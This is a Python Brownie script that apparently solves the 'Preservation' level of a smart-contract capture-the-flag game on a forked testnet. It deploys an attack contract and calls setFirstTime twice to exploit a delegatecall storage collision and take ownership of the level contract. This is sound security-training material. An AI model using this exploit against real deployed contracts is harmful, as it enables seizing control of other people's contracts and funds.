from brownie import web3, Preservation, PreservationAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "16_preservation"
INTERFACE_CONTRACT = Preservation
INSTANCE_VALUE_WEI = web3.toWei(0, "ether")


def solve_level(level_contract):
    account = get_account()

    storage_slot = web3.eth.get_storage_at(level_contract.address, 0)
    print(f"Storage slot 0 has value: {web3.toHex(storage_slot)}")
    storage_slot = web3.eth.get_storage_at(level_contract.address, 2)
    print(f"Storage slot 2 has value: {web3.toHex(storage_slot)}")

    preservation_attack = PreservationAttack.deploy({"from": account})
    tx = level_contract.setFirstTime(preservation_attack.address, {"from": account})
    tx.wait(1)
    level_contract.setFirstTime(account.address, {"from": account})

    print(f"Attack contract address: {preservation_attack.address}")
    print(f"EOA address: {account}")
    storage_slot = web3.eth.get_storage_at(level_contract.address, 0)
    print(f"Storage slot 0 has value: {web3.toHex(storage_slot)}")
    storage_slot = web3.eth.get_storage_at(level_contract.address, 2)
    print(f"Storage slot 2 has value: {web3.toHex(storage_slot)}")


# brownie run scripts/_16_preservation.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(
        LEVEL_NAME, INTERFACE_CONTRACT, INSTANCE_VALUE_WEI
    )
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
